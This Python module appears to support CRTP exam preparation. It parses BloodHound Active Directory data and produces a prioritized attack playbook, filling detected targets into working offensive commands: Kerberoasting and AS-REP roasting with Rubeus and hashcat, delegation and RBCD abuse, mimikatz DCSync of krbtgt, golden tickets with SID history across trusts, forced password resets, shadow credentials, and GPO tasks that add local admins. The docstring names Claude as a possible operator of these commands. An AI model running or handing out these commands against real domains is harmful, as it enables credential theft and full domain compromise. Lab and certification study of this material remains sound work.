"""
analyze.py — CRTP attack-path analyzer over a normalized BloodHound model.

Consumes bh_loader.Model and emits a list of Finding objects. Each Finding
carries: the technique, evidence pulled from the data, the exact commands to
run (CRTP toolset: PowerView, AD module, Rubeus, mimikatz/SafetyKatz),
what to verify, and the screenshots the CRTP report requires.

Output is intentionally command-first: the analyzer decides WHAT is attackable
from the collected data; the operator (or Claude) still runs the commands in
the authorized lab. Nothing here attacks anything — it only reads JSON.
"""

from __future__ import annotations
import re
from dataclasses import dataclass, field, asdict
from typing import List, Dict, Any, Optional

from bh_loader import Model, ADObject


# ACE rights that grant a usable takeover primitive over the target object.
ABUSABLE_RIGHTS = {
    "GenericAll", "GenericWrite", "WriteDacl", "WriteOwner", "Owns", "Owner",
    "AllExtendedRights", "ForceChangePassword", "AddMember", "AddSelf",
    "AddKeyCredentialLink", "WriteAccountRestrictions", "ReadLAPSPassword",
    "ReadGMSAPassword", "WriteSPN",
}

DCSYNC_RIGHTS = {"GetChanges", "GetChangesAll", "GetChangesInFilteredSet", "DCSync"}

# Well-known privileged RIDs / groups for high-value tagging.
HIGH_VALUE_RIDS = {
    "512": "Domain Admins", "516": "Domain Controllers", "518": "Schema Admins",
    "519": "Enterprise Admins", "520": "Group Policy Creator Owners",
    "544": "Administrators", "548": "Account Operators", "551": "Backup Operators",
    "1101": "DnsAdmins (typical)",
}

SEV = {"crit": "CRITICAL", "high": "HIGH", "med": "MEDIUM", "info": "INFO"}


@dataclass
class Finding:
    fid: str
    technique: str
    crtp_topic: str
    severity: str
    targets: List[str] = field(default_factory=list)
    evidence: List[str] = field(default_factory=list)
    commands: Dict[str, List[str]] = field(default_factory=dict)  # tool -> [cmd, ...]
    verify: List[str] = field(default_factory=list)
    screenshots: List[str] = field(default_factory=list)
    report_notes: str = ""
    priority: int = 50  # lower = do earlier / more likely on path to flags

    def dict(self):
        return asdict(self)


def _truthy(v) -> bool:
    return str(v).lower() in ("true", "1", "yes")


def _short(sid: Optional[str]) -> str:
    return sid.split("-")[-1] if sid else "?"


def _dc_sids(m: Model) -> set:
    """SIDs of domain controllers.

    SOAPHound/BloodHound v5 does NOT carry an `isdc` property, so derive DCs from
    membership of the Domain Controllers group (RID 516). Fallback at call sites
    adds a GC/ SPN check for robustness.
    """
    out = set()
    for g in m.groups.values():
        if _short(g.sid) == "516":
            for x in g.raw.get("Members") or []:
                sid = x.get("ObjectIdentifier") if isinstance(x, dict) else x
                if sid:
                    out.add(sid)
    return out


def _has_gc_spn(o: "ADObject") -> bool:
    spns = o.p("serviceprincipalnames") or []
    if not isinstance(spns, list):
        return False
    return any(str(s).upper().startswith("GC/") for s in spns)


# Default/built-in privileged principals: ACEs HELD BY these are expected, not an
# attack path (owning them already = game over). Filter them out of ACL abuse so
# the real low-priv->high-value edges are not buried.
DEFAULT_PRIV_RIDS = {
    "500",  # built-in Administrator account (owns objects by default)
    "502",  # krbtgt
    "512", "516", "517", "518", "519", "520",
    "526", "527",  # Enterprise Key Admins / Key Admins: AddKeyCredentialLink on ALL objects by default
    "544", "548", "549", "550", "551",
}
WELLKNOWN_PRIV_SIDS = {
    "S-1-5-18",        # LOCAL SYSTEM
    "S-1-5-9",         # Enterprise Domain Controllers
    "S-1-5-10",        # SELF
    "S-1-3-0",         # CREATOR OWNER
    "S-1-5-32-544", "S-1-5-32-548", "S-1-5-32-549", "S-1-5-32-550", "S-1-5-32-551",
}
WELLKNOWN_PRIV_NAMES = {
    "administrators", "domain admins", "enterprise admins", "schema admins",
    "account operators", "backup operators", "print operators", "server operators",
    "nt authority\\system", "system", "enterprise domain controllers", "self",
    "creator owner",
}


def _is_default_priv_principal(sid: Optional[str]) -> bool:
    if not sid:
        return False
    s = str(sid)
    # SharpHound prefixes built-in SIDs with the domain: "DOMAIN.FQDN-S-1-5-32-548".
    # Normalize to the trailing canonical SID so both SOAPHound and SharpHound match.
    mm = re.search(r"S-1-[0-9-]+$", s)
    core = mm.group(0) if mm else s
    if core in WELLKNOWN_PRIV_SIDS:
        return True
    # RIDs 500-551 are reserved well-known privileged principals in ANY domain,
    # so match on the trailing RID regardless of the SID's domain portion.
    if _short(core) in DEFAULT_PRIV_RIDS:
        return True
    return s.strip().lower() in WELLKNOWN_PRIV_NAMES


# ----------------------------------------------------------------------------
# Individual detectors
# ----------------------------------------------------------------------------

def detect_kerberoast(m: Model) -> List[Finding]:
    out = []
    victims = []
    for u in m.users.values():
        if not _truthy(u.p("enabled", True)):
            continue
        spn = u.p("hasspn") or u.p("serviceprincipalnames")
        name = (u.p("samaccountname") or u.name or "")
        if _truthy(u.p("hasspn")) or (isinstance(spn, list) and spn):
            if name.lower() == "krbtgt":
                continue
            victims.append(u)
    if not victims:
        return out
    for u in victims:
        name = u.p("samaccountname") or u.name
        adm = " [adminCount=1]" if _truthy(u.p("admincount")) else ""
        out.append(Finding(
            fid=f"KERB-{name}",
            technique="Kerberoasting",
            crtp_topic="Domain Privilege Escalation",
            severity=SEV["high"] if adm else SEV["med"],
            targets=[name],
            evidence=[f"{name} has SPN set{adm}; pwdlastset={u.p('pwdlastset')}"],
            commands={
                "Rubeus": [f"Rubeus.exe kerberoast /user:{name} /nowrap /outfile:hash_{name}.txt"],
                "PowerView": [f"Invoke-Kerberoast -Identity {name} | fl"],
                "AD Module": [f"Get-ADUser -Identity {name} -Properties ServicePrincipalName | select SamAccountName,ServicePrincipalName"],
                "Crack": [f"hashcat -m 13100 hash_{name}.txt <wordlist> --force"],
            },
            verify=[
                "SPN이 실제로 설정돼 있는지 (setspn -L 또는 Get-ADUser)",
                "해시 추출 성공 여부, 크랙된 평문 패스워드",
                "크랙한 계정이 어떤 그룹/권한을 가지는지 확인",
            ],
            screenshots=[
                f"{name} SPN 확인 (Get-ADUser/setspn 출력)",
                "Rubeus kerberoast 해시 추출 화면",
                "hashcat 크랙 성공 (평문 노출) 화면",
                "크랙한 계정으로 인증/권한 확인 화면",
            ],
            report_notes=f"Kerberoasting {name}. adminCount 계정이면 곧바로 권한 상승 경로일 수 있음.",
            priority=20 if adm else 35,
        ))
    return out


def detect_asrep(m: Model) -> List[Finding]:
    out = []
    for u in m.users.values():
        if _truthy(u.p("dontreqpreauth")):
            name = u.p("samaccountname") or u.name
            out.append(Finding(
                fid=f"ASREP-{name}",
                technique="AS-REP Roasting",
                crtp_topic="Domain Privilege Escalation",
                severity=SEV["high"],
                targets=[name],
                evidence=[f"{name} has DONT_REQ_PREAUTH set"],
                commands={
                    "Rubeus": [f"Rubeus.exe asreproast /user:{name} /nowrap /format:hashcat /outfile:asrep_{name}.txt"],
                    "AD Module": ["Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true} -Properties DoesNotRequirePreAuth"],
                    "Crack": [f"hashcat -m 18200 asrep_{name}.txt <wordlist> --force"],
                },
                verify=["preauth 미요구 플래그 확인", "해시 추출 및 크랙 결과"],
                screenshots=[
                    f"{name} DoesNotRequirePreAuth 확인 화면",
                    "Rubeus asreproast 추출 화면",
                    "hashcat 크랙 성공 화면",
                ],
                report_notes=f"AS-REP roasting {name} — 사전 인증 불필요 계정.",
                priority=22,
            ))
    return out


def detect_unconstrained(m: Model) -> List[Finding]:
    out = []
    dc_sids = _dc_sids(m)
    for kind, bucket in (("computer", m.computers), ("user", m.users)):
        for o in bucket.values():
            if not _truthy(o.p("unconstraineddelegation")):
                continue
            name = o.p("samaccountname") or o.name
            # SOAPHound has no `isdc`; a DC is a member of Domain Controllers (RID
            # 516) or advertises a GC/ SPN. DC unconstrained deleg is expected.
            is_dc = kind == "computer" and (
                o.sid in dc_sids or _has_gc_spn(o) or _truthy(o.p("isdc"))
            )
            out.append(Finding(
                fid=f"UNCONST-{name}",
                technique="Unconstrained Delegation abuse",
                crtp_topic="Domain Privilege Escalation",
                severity=SEV["crit"] if not is_dc else SEV["info"],
                targets=[name],
                evidence=[f"{name} ({kind}) TRUSTED_FOR_DELEGATION" + (" [DC — expected]" if is_dc else "")],
                commands={
                    "Enum (PowerView)": ["Get-DomainComputer -Unconstrained | select samaccountname",
                                          "Get-DomainUser -TrustedToAuth | select samaccountname"],
                    "Rubeus monitor": ["Rubeus.exe monitor /interval:5 /nowrap"],
                    "Coerce (auth)": ["# PetitPotam / SpoolSample 로 DC 인증 강제 → TGT 캡처",
                                       "Rubeus.exe tgtdeleg"],
                    "PTT": ["Rubeus.exe ptt /ticket:<base64_TGT>"],
                },
                verify=[
                    "해당 호스트에 로컬 관리자 권한이 있는지 (티켓 모니터링 전제)",
                    "캡처된 TGT의 주체가 특권 계정/DC 컴퓨터 계정인지",
                ],
                screenshots=[
                    f"{name} Unconstrained delegation 속성 확인",
                    "Rubeus monitor 로 캡처된 TGT 화면",
                    "PTT 후 특권 접근 확인 (예: DCSync 또는 DC 접근)",
                ],
                report_notes="비-DC 호스트의 무제약 위임은 치명적. DC 인증 강제 후 TGT 탈취 경로.",
                priority=15 if not is_dc else 80,
            ))
    return out


def detect_constrained(m: Model) -> List[Finding]:
    out = []
    for kind, bucket in (("computer", m.computers), ("user", m.users)):
        for o in bucket.values():
            atd = o.raw.get("AllowedToDelegate") or o.p("allowedtodelegate")
            if not atd:
                continue
            name = o.p("samaccountname") or o.name
            tgt_list = atd if isinstance(atd, list) else [atd]
            targets = [t.get("ObjectIdentifier", t) if isinstance(t, dict) else t for t in tgt_list]
            out.append(Finding(
                fid=f"CONST-{name}",
                technique="Constrained Delegation abuse (S4U)",
                crtp_topic="Domain Privilege Escalation",
                severity=SEV["crit"],
                targets=[name] + [str(t) for t in targets],
                evidence=[f"{name} msDS-AllowedToDelegateTo -> {targets}"],
                commands={
                    "Enum (PowerView)": ["Get-DomainUser -TrustedToAuth | select samaccountname,msds-allowedtodelegateto",
                                          "Get-DomainComputer -TrustedToAuth | select samaccountname,msds-allowedtodelegateto"],
                    "S4U (Rubeus)": [
                        f"Rubeus.exe hash /password:<pw_of_{name}> /user:{name} /domain:{m.domain}",
                        f"Rubeus.exe s4u /user:{name} /rc4:<hash> /impersonateuser:Administrator /msdsspn:<spn_from_list> /ptt",
                    ],
                },
                verify=[
                    "위임 대상 SPN 서비스가 무엇인지 (CIFS/HTTP/HOST 등)",
                    "impersonate 한 계정이 해당 서비스에 관리자 접근 가능한지",
                    "protocol transition(S4U2Self) 가능 여부",
                ],
                screenshots=[
                    f"{name} msDS-AllowedToDelegateTo 속성 확인",
                    "Rubeus s4u 티켓 발급 화면",
                    "impersonate 후 대상 서비스 접근 (dir \\\\target\\c$ 등)",
                ],
                report_notes="Constrained delegation + S4U 로 대상 서비스에 임의 사용자 위임 가능.",
                priority=14,
            ))
    return out


def detect_rbcd(m: Model) -> List[Finding]:
    out = []
    for c in m.computers.values():
        ata = c.raw.get("AllowedToAct") or c.p("allowedtoact") or c.p("msds-allowedtoactonbehalfofotheridentity")
        if not ata:
            continue
        name = c.p("samaccountname") or c.name
        principals = ata if isinstance(ata, list) else [ata]
        who = [p.get("ObjectIdentifier", p) if isinstance(p, dict) else p for p in principals]
        out.append(Finding(
            fid=f"RBCD-{name}",
            technique="Resource-Based Constrained Delegation abuse",
            crtp_topic="Domain Privilege Escalation",
            severity=SEV["crit"],
            targets=[name],
            evidence=[f"{name} msDS-AllowedToActOnBehalfOfOtherIdentity <- {who}"],
            commands={
                "Set RBCD (PowerView)": [
                    f"Set-DomainObject -Identity {name} -Set @{{'msds-allowedtoactonbehalfofotheridentity'=<sd_bytes>}}",
                    "# 또는 이미 설정돼 있으면 아래 S4U 바로 진행",
                ],
                "S4U (Rubeus)": [
                    "Rubeus.exe hash /password:<controlled_computer_pw>",
                    f"Rubeus.exe s4u /user:<controlled_computer$> /rc4:<hash> /impersonateuser:Administrator /msdsspn:cifs/{name} /ptt",
                ],
            },
            verify=["내가 제어하는 계정이 위 principal 에 포함되는지",
                    "S4U 후 대상 컴퓨터 관리자 접근 확인"],
            screenshots=[
                f"{name} RBCD 속성 확인",
                "Rubeus s4u /ptt 화면",
                f"dir \\\\{name}\\c$ 접근 성공 화면",
            ],
            report_notes="RBCD: 제어 가능한 컴퓨터 계정으로 대상에 임의 사용자 위임.",
            priority=13,
        ))
    return out


# Collapse this many (or more) same principal+right edges onto low-value targets
# into a single bulk finding, so one broadly-granted group right doesn't flood the
# playbook with dozens of near-identical rows.
ACL_AGG_THRESHOLD = 4


def detect_acl_abuse(m: Model) -> List[Finding]:
    out = []
    # group abusable ACEs by (principal, right) so broad grants collapse
    groups: Dict[tuple, list] = {}
    for obj in m.all_objects():
        for ace in obj.aces:
            right = ace.get("right")
            if right not in ABUSABLE_RIGHTS:
                continue
            # Skip ACEs held by built-in privileged principals (Domain/Enterprise
            # Admins, Administrators, SYSTEM, SELF, ...). These are expected and
            # not attack paths; keeping them buries the real low-priv edges.
            psid = ace.get("principal_sid")
            if _is_default_priv_principal(psid):
                continue
            tgt_hv = _truthy(obj.p("admincount")) or _short(obj.sid) in HIGH_VALUE_RIDS
            # Inherited ACEs are almost always structural/default; keep one only
            # when it lands on a high-value object (a targeted edge worth chasing).
            if ace.get("inherited") and not tgt_hv:
                continue
            groups.setdefault((psid, right), []).append((obj, tgt_hv, bool(ace.get("inherited"))))

    for (psid, right), items in groups.items():
        principal = m.name_for(psid)
        hv_items = [it for it in items if it[1]]
        lo_items = [it for it in items if not it[1]]
        # high-value targets: always granular (own screenshots, top priority)
        for obj, _hv, inh in hv_items:
            out.append(_acl_finding(right, principal, psid, obj, True, inh))
        # low-value targets: collapse into one finding when a single grant is broad
        if len(lo_items) >= ACL_AGG_THRESHOLD:
            out.append(_acl_bulk_finding(right, principal, psid, [o for o, _, _ in lo_items]))
        else:
            for obj, _hv, inh in lo_items:
                out.append(_acl_finding(right, principal, psid, obj, False, inh))
    return out


def _acl_finding(right, principal, psid, obj: ADObject, tgt_hv: bool, inherited: bool) -> Finding:
    tgt = obj.name or obj.sid
    return Finding(
        fid=f"ACL-{right}-{tgt}-{(psid or '')[-4:]}",
        technique=f"ACL abuse: {right}",
        crtp_topic="Domain Privilege Escalation / Persistence",
        severity=SEV["crit"] if tgt_hv else SEV["high"],
        targets=[str(tgt)],
        evidence=[f"{principal} has {right} over {tgt}"
                  + (" [HIGH-VALUE target]" if tgt_hv else "")
                  + (" (inherited)" if inherited else "")],
        commands=_acl_commands(right, principal, obj),
        verify=[
            f"{principal} 를 실제로 제어 가능한지 (현재 컨텍스트/크랙된 자격)",
            "권한 행사 후 대상에 대한 실질적 접근 획득 확인",
        ],
        screenshots=[
            f"ACL 확인: Get-DomainObjectAcl -Identity {tgt} 출력",
            "권한 남용 실행 화면 (그룹 추가 / 패스워드 변경 등)",
            "남용 후 획득한 접근 증명 화면",
        ],
        report_notes=f"{principal} -({right})-> {tgt}. CRTP 경로에서 자주 나오는 ACL 체인.",
        priority=10 if tgt_hv else 25,
    )


def _acl_bulk_finding(right, principal, psid, objs: List[ADObject]) -> Finding:
    names = [str(o.name or o.sid) for o in objs]
    sample = ", ".join(names[:6]) + (f" … (+{len(names) - 6} more)" if len(names) > 6 else "")
    return Finding(
        fid=f"ACL-{right}-BULK-{(psid or '')[-4:]}",
        technique=f"ACL abuse: {right} (bulk — {len(names)} targets)",
        crtp_topic="Domain Privilege Escalation / Persistence",
        severity=SEV["high"],
        targets=names,
        evidence=[f"{principal} has {right} over {len(names)} objects: {sample}"],
        commands=_acl_commands(right, principal, objs[0]),
        verify=[
            f"{principal} 를 실제로 제어 가능한지 (현재 컨텍스트/크랙된 자격)",
            "경로에 필요한 대상 1개만 선택해 권한 행사 (전부 할 필요 없음)",
        ],
        screenshots=[
            "ACL 확인 출력 (대표 대상 1개)",
            "권한 남용 실행 화면", "남용 후 획득 접근 증명 화면",
        ],
        report_notes=(f"{principal} 가 {len(names)}개 객체에 {right} — 보통 그룹 권한으로 "
                      f"일괄 부여된 관계. 경로에 필요한 대상만 선택적으로 악용."),
        priority=26,
    )


def _acl_commands(right: str, principal: str, obj: ADObject) -> Dict[str, List[str]]:
    tgt = obj.p("samaccountname") or obj.name or obj.sid
    if right in ("ForceChangePassword",):
        return {"PowerView": [
            "$pw = ConvertTo-SecureString '<NewPass123!>' -AsPlainText -Force",
            f"Set-DomainUserPassword -Identity {tgt} -AccountPassword $pw"]}
    if right in ("AddMember",) or (obj.kind == "group"):
        return {"PowerView": [f"Add-DomainGroupMember -Identity '{tgt}' -Members <you>"],
                "AD Module": [f"Add-ADGroupMember -Identity '{tgt}' -Members <you>"]}
    if right in ("AddKeyCredentialLink",):
        return {"Whisker/Certipy": [
            f"Whisker.exe add /target:{tgt}",
            "Rubeus.exe asktgt /user:{tgt} /certificate:<pfx> /password:<pfx_pw> /ptt"]}
    if right in ("ReadGMSAPassword",):
        return {"PowerView/GMSA": [f"Get-DomainObject -Identity {tgt} -Properties msds-managedpassword"]}
    if right in ("ReadLAPSPassword",):
        return {"LAPS": [f"Get-DomainObject -Identity {tgt} -Properties ms-mcs-admpwd"]}
    # GenericAll / GenericWrite / WriteDacl / WriteOwner / Owns
    if obj.kind == "user":
        return {"Targeted (choose one)": [
            "# 옵션 A: 패스워드 리셋",
            f"Set-DomainUserPassword -Identity {tgt} -AccountPassword (ConvertTo-SecureString '<NewPass123!>' -AsPlainText -Force)",
            "# 옵션 B: Targeted Kerberoast (SPN 부여 후 로스팅)",
            f"Set-DomainObject -Identity {tgt} -Set @{{serviceprincipalname='fake/svc'}}",
            f"Rubeus.exe kerberoast /user:{tgt} /nowrap",
            "# 옵션 C: Shadow Credentials",
            f"Whisker.exe add /target:{tgt}"]}
    if right in ("WriteDacl", "WriteOwner", "Owns", "Owner", "GenericAll"):
        return {"PowerView": [
            f"# 소유권/DACL 장악 후 권한 부여",
            f"Set-DomainObjectOwner -Identity {tgt} -OwnerIdentity <you>",
            f"Add-DomainObjectAcl -TargetIdentity {tgt} -PrincipalIdentity <you> -Rights All"]}
    return {"PowerView": [f"Get-DomainObjectAcl -Identity {tgt} -ResolveGUIDs"]}


def detect_dcsync(m: Model) -> List[Finding]:
    out = []
    # DCSync rights are ACEs on the DOMAIN object
    for dom in m.domains.values():
        holders: Dict[str, set] = {}
        for ace in dom.aces:
            if ace.get("right") in DCSYNC_RIGHTS:
                holders.setdefault(ace.get("principal_sid"), set()).add(ace.get("right"))
        for sid, rights in holders.items():
            if {"GetChanges", "GetChangesAll"} & rights or "DCSync" in rights:
                who = m.name_for(sid)
                out.append(Finding(
                    fid=f"DCSYNC-{sid[-6:] if sid else '?'}",
                    technique="DCSync",
                    crtp_topic="Domain Persistence / Credential Access",
                    severity=SEV["crit"],
                    targets=[who],
                    evidence=[f"{who} holds {sorted(rights)} on {dom.name}"],
                    commands={
                        "mimikatz": [f'lsadump::dcsync /user:{m.domain}\\krbtgt',
                                      f'lsadump::dcsync /user:{m.domain}\\Administrator'],
                        "Rubeus/secretsdump": ["# 대안: secretsdump.py -just-dc <dom>/<user>@<dc>"],
                    },
                    verify=[f"현재 컨텍스트가 {who} 인지/될 수 있는지",
                            "krbtgt 해시 확보 여부 (Golden Ticket 전제)"],
                    screenshots=[
                        f"{who} 의 GetChanges/GetChangesAll 권한 확인 (Get-DomainObjectAcl)",
                        "dcsync 로 krbtgt 해시 덤프 화면",
                    ],
                    report_notes="DCSync 권한 → krbtgt 해시 → Golden Ticket 로 도메인 지속성.",
                    priority=8,
                ))
    return out


def detect_delegated_admins(m: Model) -> List[Finding]:
    """High-value group membership & adminCount users worth flagging as objectives."""
    out = []
    for g in m.groups.values():
        rid = _short(g.sid)
        if rid in HIGH_VALUE_RIDS:
            members = g.raw.get("Members") or []
            mnames = [m.name_for(x.get("ObjectIdentifier") if isinstance(x, dict) else x) for x in members]
            out.append(Finding(
                fid=f"HV-{HIGH_VALUE_RIDS[rid].replace(' ','')}",
                technique=f"High-value group: {HIGH_VALUE_RIDS[rid]}",
                crtp_topic="Enumeration / Objective",
                severity=SEV["info"],
                targets=mnames or [g.name],
                evidence=[f"{HIGH_VALUE_RIDS[rid]} members: {mnames}"],
                commands={
                    "PowerView": [f"Get-DomainGroupMember -Identity '{g.p('samaccountname') or HIGH_VALUE_RIDS[rid]}' -Recurse"],
                    "AD Module": [f"Get-ADGroupMember -Identity '{HIGH_VALUE_RIDS[rid]}' -Recursive"],
                },
                verify=["최종 목표 계정 식별", "현재 경로가 이 그룹으로 수렴하는지"],
                screenshots=[f"{HIGH_VALUE_RIDS[rid]} 멤버십 확인 화면"],
                report_notes="공격 경로의 최종 목적지 후보. flag 는 보통 이 권한 획득 후 접근 가능.",
                priority=5,
            ))
    return out


def detect_creds_in_desc(m: Model) -> List[Finding]:
    out = []
    for u in m.users.values():
        desc = (u.p("description") or "")
        if not desc:
            continue
        low = desc.lower()
        if any(k in low for k in ("pass", "pwd", "pw:", "cred", "!", "1234", "temp")):
            name = u.p("samaccountname") or u.name
            out.append(Finding(
                fid=f"DESC-{name}",
                technique="Credentials in description",
                crtp_topic="Enumeration / Credential Access",
                severity=SEV["med"],
                targets=[name],
                evidence=[f"{name} description = '{desc}'"],
                commands={"PowerView": ["Get-DomainUser | ?{$_.description} | select samaccountname,description"]},
                verify=["description 의 문자열이 실제 유효 자격인지 로그인 테스트"],
                screenshots=[f"{name} description 노출 화면", "해당 자격으로 인증 성공 화면"],
                report_notes="설명 필드 평문 자격. 쉬운 초기 발판.",
                priority=18,
            ))
    return out


def detect_trusts(m: Model) -> List[Finding]:
    out = []
    for dom in m.domains.values():
        trusts = dom.raw.get("Trusts") or []
        for t in trusts:
            tgt = t.get("TargetDomainName") or t.get("TargetDomainSid") or "<trust>"
            tgt_sid = t.get("TargetDomainSid")
            direction = t.get("TrustDirection")
            ttype = t.get("TrustType")
            transitive = t.get("IsTransitive")
            sidfilter = t.get("SidFilteringEnabled")
            child_dns = dom.name or m.domain
            child_sid = dom.sid or m.domain_sid

            # Build the inter-realm golden-ticket command with REAL values from the
            # JSON (child domain/SID, target domain EA SID). Only genuinely runtime
            # values stay as <placeholders>: the krbtgt hash (got via DCSync later).
            cmds = {"Enum": ["Get-DomainTrust", "Get-DomainTrustMapping", "Get-ADTrust -Filter *"]}
            if tgt_sid and child_sid and child_dns:
                golden = (f"mimikatz: kerberos::golden /user:Administrator "
                          f"/domain:{child_dns} /sid:{child_sid} "
                          f"/krbtgt:<child_krbtgt_hash> /sids:{tgt_sid}-519 /ptt")
                if sidfilter:
                    cmds["SID history (⚠ SID filtering ON — 차단 가능성)"] = [
                        "# 이 트러스트는 SID filtering 켜짐 → SID history 주입이 필터될 수 있음",
                        "# <child_krbtgt_hash> 는 DCSync 로 확보",
                        golden]
                else:
                    cmds["SID history (SID filtering OFF — 사용 가능)"] = [
                        "# <child_krbtgt_hash> 는 DCSync 로 확보 (그 외 값은 데이터서 채움)",
                        golden]
            cmds["대상 도메인 추가 열거"] = [f"Get-DomainTrust -Domain {tgt}"]

            sf_txt = "ON" if sidfilter else ("OFF" if sidfilter is not None else "?")
            out.append(Finding(
                fid=f"TRUST-{tgt}",
                technique="Domain/Forest trust abuse",
                crtp_topic="Cross Trust Attacks",
                severity=SEV["high"],
                targets=[str(tgt)],
                evidence=[f"{dom.name} <-> {tgt} dir={direction} type={ttype} "
                          f"transitive={transitive} SIDfilter={sf_txt} targetSID={tgt_sid}"],
                commands=cmds,
                verify=["신뢰 방향/타입(부모-자식 vs 포레스트)",
                        f"SID filtering = {sf_txt} (OFF여야 SID history 통함)",
                        "child krbtgt 해시 확보 여부"],
                screenshots=["Get-DomainTrustMapping 출력",
                             "위조 티켓으로 대상 도메인 리소스 접근 화면"],
                report_notes=(f"대상 {tgt} (SID {tgt_sid}). SID filtering={sf_txt}. "
                              "OFF면 child krbtgt + 대상 EA SID(-519)로 inter-realm TGT 위조."),
                priority=12,
            ))
    return out


GPO_ABUSE_RIGHTS = {"GenericAll", "GenericWrite", "WriteDacl", "WriteOwner", "Owns", "WriteProperty"}


def detect_gpo_abuse(m: Model) -> List[Finding]:
    """Who can edit a GPO -> which OUs it links -> which computers get code (LO 6)."""
    out = []
    # gpo GUID -> set of affected computer names (via OU Links -> OU ChildObjects)
    gpo_affected: Dict[str, set] = {}
    for ou in m.ous.values():
        linked = [str(lk.get("GUID") or "").upper() for lk in (ou.raw.get("Links") or [])]
        comps = [m.name_for(x.get("ObjectIdentifier"))
                 for x in (ou.raw.get("ChildObjects") or [])
                 if isinstance(x, dict) and x.get("ObjectType") == "Computer"]
        for gid in linked:
            gpo_affected.setdefault(gid, set()).update(comps)

    for g in m.gpos.values():
        gid = str(g.sid or "").upper()
        for ace in g.aces:
            right = ace.get("right")
            if right not in GPO_ABUSE_RIGHTS:
                continue
            # only non-default principals, direct ACEs (same noise rules as ACL)
            if _is_default_priv_principal(ace.get("principal_sid")) or ace.get("inherited"):
                continue
            principal = m.name_for(ace.get("principal_sid"))
            affected = sorted(gpo_affected.get(gid, []))
            gpo_name = g.p("samaccountname") or g.name
            impact = (f"{len(affected)} computer(s): " + ", ".join(affected[:6])
                      + (" …" if len(affected) > 6 else "")) if affected else "(링크 OU에 컴퓨터 없음 / 미매핑)"
            out.append(Finding(
                fid=f"GPO-{right}-{gpo_name}-{(ace.get('principal_sid') or '')[-4:]}",
                technique=f"GPO abuse: {right} over GPO",
                crtp_topic="Domain Privilege Escalation",
                severity=SEV["crit"] if affected else SEV["high"],
                targets=affected or [str(gpo_name)],
                evidence=[f"{principal} has {right} over GPO '{gpo_name}' -> affects {impact}"],
                commands={
                    "Enum": [f"Get-DomainGPO -Identity '{gpo_name}'",
                             "Get-DomainOU -GPLink <gpo_guid> | select name,distinguishedname"],
                    "Abuse (SharpGPOAbuse)": [
                        f"SharpGPOAbuse.exe --AddLocalAdmin --UserAccount <you> --GPOName \"{gpo_name}\"",
                        f"SharpGPOAbuse.exe --AddComputerTask --TaskName upd --Author <dom\\you> "
                        f"--Command cmd.exe --Arguments \"/c net localgroup administrators <you> /add\" "
                        f"--GPOName \"{gpo_name}\""],
                    "PowerView": [f"New-GPOImmediateTask -TaskName x -GPODisplayName '{gpo_name}' "
                                  f"-CommandArguments '<cmd>' -Force"],
                },
                verify=[f"{principal} 를 실제로 제어 가능한지",
                        "GPO 수정 후 영향 컴퓨터의 gpupdate 시점에 실행되는지",
                        "영향 컴퓨터가 5대 타깃에 포함되는지"],
                screenshots=[f"GPO '{gpo_name}' ACL 확인 (Get-DomainGPO / Get-DomainObjectAcl)",
                             "GPO 수정 / task 추가 화면", "영향 호스트에서 권한 획득 화면"],
                report_notes=f"{principal} -({right})-> GPO '{gpo_name}' -> 링크된 OU의 컴퓨터에 코드 실행 (GPO Abuse, LO6).",
                priority=11 if affected else 24,
            ))
    return out


DETECTORS = [
    detect_delegated_admins,   # objectives first
    detect_dcsync,
    detect_acl_abuse,
    detect_gpo_abuse,
    detect_rbcd,
    detect_constrained,
    detect_unconstrained,
    detect_trusts,
    detect_creds_in_desc,
    detect_asrep,
    detect_kerberoast,
]


def analyze(m: Model) -> List[Finding]:
    findings: List[Finding] = []
    for det in DETECTORS:
        try:
            findings.extend(det(m))
        except Exception as e:  # noqa
            findings.append(Finding(
                fid=f"ERR-{det.__name__}",
                technique=f"analyzer error in {det.__name__}",
                crtp_topic="meta", severity=SEV["info"],
                evidence=[str(e)], priority=99))
    findings.sort(key=lambda f: (f.priority, f.fid))
    return findings
